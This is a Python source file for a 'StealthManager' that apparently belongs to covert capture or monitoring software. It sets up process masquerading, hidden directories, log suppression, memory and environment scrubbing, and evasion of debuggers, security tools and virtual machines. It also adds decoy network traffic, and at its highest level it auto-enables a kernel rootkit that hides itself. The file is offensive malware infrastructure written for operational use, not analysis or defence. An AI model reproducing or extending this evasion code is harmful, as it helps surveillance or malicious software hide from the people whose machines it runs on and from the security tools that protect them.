"""
StealthManager — central orchestrator for all stealth subsystems.

Initialises, configures, and manages the eleven stealth modules based on
a single ``stealth:`` config section and a preset *level*.

Stealth Levels
--------------
- ``off``     : no stealth measures (current behaviour)
- ``low``     : process rename + log suppression + hidden files + crash guard
- ``medium``  : adds resource profiling + detection awareness + env sanitiser
- ``high``    : adds network normalisation + transport bridge + image scrubbing + memory cloak
- ``maximum`` : everything enabled, memory-only logging, minimal disk, auto-hibernate, decoy traffic

Usage::

    from stealth import StealthManager

    sm = StealthManager(config)
    sm.activate()                       # one-call setup
    sm.resource_profiler.jittered_interval(30)
    sm.stop()
"""
from __future__ import annotations

import logging
import os
from typing import Any

from stealth.process_masking import ProcessMasker
from stealth.fs_cloak import FileSystemCloak
from stealth.log_controller import LogController
from stealth.resource_profiler import ResourceProfiler
from stealth.detection_awareness import DetectionAwareness
from stealth.network_normalizer import NetworkNormalizer
from stealth.crash_guard import CrashGuard
from stealth.memory_cloak import MemoryCloak
from stealth.image_scrubber import ImageScrubber
from stealth.env_sanitizer import EnvSanitizer
from stealth.transport_bridge import TransportBridge

logger = logging.getLogger(__name__)

# Optional rootkit import (only available when rootkit package is present)
try:
    from rootkit.manager import RootkitManager
    _ROOTKIT_AVAILABLE = True
except ImportError:
    _ROOTKIT_AVAILABLE = False

# ── Level presets ────────────────────────────────────────────────────
# Each level specifies overrides applied on top of the user's config.

_LEVEL_PRESETS: dict[str, dict[str, Any]] = {
    "off": {},
    "low": {
        "process": {"masquerade_name": "auto", "sanitize_threads": True, "sanitize_argv": True},
        "filesystem": {"hidden_dirs": True},
        "logging": {"silent_mode": True, "suppress_file_log": True, "suppress_startup_banner": True},
    },
    "medium": {
        "process": {"masquerade_name": "auto", "sanitize_threads": True, "sanitize_argv": True},
        "filesystem": {"hidden_dirs": True, "timestamp_preservation": True},
        "logging": {"silent_mode": True, "suppress_file_log": True, "suppress_startup_banner": True,
                     "memory_ring_buffer": True, "sanitize_messages": True},
        "resources": {"cpu_jitter_factor": 0.3, "cpu_ceiling": 15, "io_spread": True},
        "detection": {"enabled": True},
    },
    "high": {
        "process": {"masquerade_name": "auto", "sanitize_threads": True, "sanitize_argv": True,
                     "rotate_interval": 600},
        "filesystem": {"hidden_dirs": True, "timestamp_preservation": True},
        "logging": {"silent_mode": True, "suppress_file_log": True, "suppress_startup_banner": True,
                     "memory_ring_buffer": True, "sanitize_messages": True},
        "resources": {"cpu_jitter_factor": 0.4, "cpu_ceiling": 10, "io_spread": True,
                      "idle_sleep_interval": 30},
        "detection": {"enabled": True, "monitor_response": "throttle",
                      "debugger_response": "pause", "security_tool_response": "pause"},
        "network": {"timing_jitter": 0.4, "packet_normalization": True,
                    "user_agent_rotation": True},
    },
    "maximum": {
        "process": {"masquerade_name": "auto", "sanitize_threads": True, "sanitize_argv": True,
                     "rotate_interval": 300},
        "filesystem": {"hidden_dirs": True, "timestamp_preservation": True,
                       "minimal_footprint": True},
        "logging": {"silent_mode": True, "suppress_file_log": True, "suppress_startup_banner": True,
                     "memory_ring_buffer": True, "ring_buffer_size": 200,
                     "sanitize_messages": True},
        "resources": {"cpu_jitter_factor": 0.5, "cpu_ceiling": 8, "io_spread": True,
                      "idle_sleep_interval": 60},
        "detection": {"enabled": True, "scan_interval_min": 5, "scan_interval_max": 30,
                      "monitor_response": "pause", "debugger_response": "hibernate",
                      "security_tool_response": "hibernate", "vm_detection": True,
                      "vm_response": "throttle"},
        "network": {"timing_jitter": 0.5, "packet_normalization": True,
                    "user_agent_rotation": True, "decoy_traffic": True,
                    "send_window": {"enabled": True, "start_hour": 8, "end_hour": 20}},
    },
}


def _deep_merge(base: dict, overlay: dict) -> dict:
    """Recursively merge *overlay* into *base* (returns new dict)."""
    merged = dict(base)
    for key, value in overlay.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = _deep_merge(merged[key], value)
        else:
            merged[key] = value
    return merged


class StealthManager:
    """Facade that coordinates all stealth subsystems.

    Parameters
    ----------
    config : dict
        The full ``stealth:`` configuration section.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        raw_cfg = config or {}
        self._enabled: bool = bool(raw_cfg.get("enabled", False))
        self._level: str = str(raw_cfg.get("level", "off"))

        # Apply level preset, then overlay user config
        preset = _LEVEL_PRESETS.get(self._level, {})
        effective = _deep_merge(preset, raw_cfg)

        # ── Original 6 subsystems ────────────────────────────────────
        self.process_masker = ProcessMasker(effective.get("process"))
        self.fs_cloak = FileSystemCloak(effective.get("filesystem"))
        self.log_controller = LogController(effective.get("logging"))
        self.resource_profiler = ResourceProfiler(effective.get("resources"))
        self.detection = DetectionAwareness(effective.get("detection"))
        self.network = NetworkNormalizer(effective.get("network"))

        # ── Enhanced subsystems (v2) ─────────────────────────────────
        self.crash_guard = CrashGuard(
            effective,
            ring_buffer=None,  # set after log_controller.apply()
        )
        self.memory_cloak = MemoryCloak(effective)
        self.image_scrubber = ImageScrubber()
        self.env_sanitizer = EnvSanitizer(effective)
        self.transport_bridge = TransportBridge(self.network, effective.get("network"))

        # ── Rootkit integration (v3, optional) ───────────────────────
        self.rootkit: Any = None
        if _ROOTKIT_AVAILABLE:
            rootkit_cfg = raw_cfg.get("rootkit", {})
            # Auto-enable rootkit at maximum level
            if self._level == "maximum" and "enabled" not in rootkit_cfg:
                rootkit_cfg["enabled"] = True
            self.rootkit = RootkitManager(rootkit_cfg)

        self._activated = False

    # ── Public API ───────────────────────────────────────────────────

    @property
    def enabled(self) -> bool:
        return self._enabled

    @property
    def level(self) -> str:
        return self._level

    def activate(self) -> None:
        """One-call activation of all stealth subsystems.

        Call this early in the application lifecycle (after config load,
        before PID lock and capture start).

        Activation order matters:
          1. Crash guard (catch any errors during stealth activation itself)
          2. File-system cloak (create directories)
          3. Log controller (suppress output)
          4. Environment sanitiser (clean env vars and argv)
          5. Process masking (rename process/threads)
          6. Resource profiling (lower CPU priority)
          7. Detection awareness scanner (background thread)
          8. Memory cloak (rename sys.modules, scrub __file__) -- MUST be last
        """
        if not self._enabled or self._activated:
            return

        logger.debug("Activating stealth mode (level=%s)", self._level)

        failed_subsystems: list[str] = []

        def _safe_activate(name: str, fn: Any) -> None:
            """Run a subsystem activation, logging and continuing on failure."""
            try:
                fn()
            except Exception as exc:
                failed_subsystems.append(name)
                logger.error(
                    "Stealth subsystem '%s' failed to activate: %s", name, exc,
                    exc_info=True,
                )

        # 1. Crash guard first — catches errors in subsequent steps
        _safe_activate("crash_guard", self.crash_guard.install)

        # 2. File-system cloak (creates directories)
        _safe_activate("fs_cloak", self.fs_cloak.apply)

        # 3. Log controller (suppress output before noisy init)
        _safe_activate("log_controller", self.log_controller.apply)
        # Wire ring buffer into crash guard now that it exists
        try:
            self.crash_guard._ring_buffer = self.log_controller.get_ring_buffer()
        except Exception:
            pass

        # 4. Environment sanitiser
        _safe_activate("env_sanitizer", self.env_sanitizer.apply)

        # 5. Process masking
        _safe_activate("process_masker", self.process_masker.apply)

        # 6. Resource profiling (lower priority)
        _safe_activate("resource_profiler", self.resource_profiler.apply_priority)

        # 7. Detection awareness scanner (background thread)
        _safe_activate("detection", self.detection.start)

        # 8. Transport bridge — decoy traffic (if enabled at this level)
        _safe_activate("transport_bridge", self.transport_bridge.start_decoy_traffic)

        # 9. Memory cloak — MUST be last Python-level step (renames modules)
        _safe_activate("memory_cloak", self.memory_cloak.apply)

        # 10. Rootkit — kernel-level hiding (if available and enabled)
        if self.rootkit is not None and self.rootkit.enabled:
            try:
                if self.rootkit.install():
                    self.rootkit.hide_self()
                    logger.debug("Rootkit: kernel-level hiding active")
                else:
                    logger.debug("Rootkit: not loaded (no root or compilation failed)")
            except Exception as exc:
                failed_subsystems.append("rootkit")
                logger.error("Rootkit activation failed: %s", exc, exc_info=True)

        self._activated = True
        if failed_subsystems:
            logger.warning(
                "Stealth mode active with %d failed subsystem(s): %s",
                len(failed_subsystems), ", ".join(failed_subsystems),
            )
        else:
            logger.debug("Stealth mode active (all subsystems OK)")

    def stop(self) -> None:
        """Gracefully shut down stealth subsystems."""
        # Unload rootkit first (restores kernel visibility for clean shutdown)
        if self.rootkit is not None and self.rootkit.installed:
            self.rootkit.uninstall()
        self.transport_bridge.stop_decoy_traffic()
        self.detection.stop()
        self.process_masker.stop()
        self.crash_guard.uninstall()
        self._activated = False

    def get_status(self) -> dict[str, Any]:
        """Return a comprehensive status snapshot for dashboards / fleet."""
        return {
            "enabled": self._enabled,
            "level": self._level,
            "activated": self._activated,
            "detection": self.detection.get_status(),
            "resources": self.resource_profiler.get_status(),
            "network": self.network.get_status(),
            "crash_guard_installed": self.crash_guard._installed,
            "memory_cloak_applied": self.memory_cloak._applied,
            "env_sanitized": self.env_sanitizer._applied,
            "rootkit": self.rootkit.get_status() if self.rootkit else {"enabled": False},
        }

    # ── Convenience accessors ────────────────────────────────────────

    def should_suppress_banner(self) -> bool:
        """Whether the startup system-info banner should be skipped."""
        return self._enabled and self.log_controller.suppress_startup_banner

    def get_pid_path(self) -> str:
        """Stealthy PID file path (or default)."""
        if not self._enabled:
            import tempfile
            return os.path.join(tempfile.gettempdir(), ".system-helper.pid")
        return self.fs_cloak.get_pid_path()

    def get_data_dir(self) -> str:
        """Stealthy data directory (or default)."""
        if not self._enabled:
            return "./data"
        return self.fs_cloak.get_data_dir()

    def patch_transport(self, transport: Any) -> None:
        """Convenience method to patch a transport with stealth network bridge."""
        if self._enabled:
            self.transport_bridge.patch_transport(transport)

    def patch_connectivity(self, monitor: Any) -> None:
        """Convenience method to patch connectivity probe with stealth HTTPS probe."""
        if self._enabled:
            self.transport_bridge.patch_connectivity_probe(monitor)
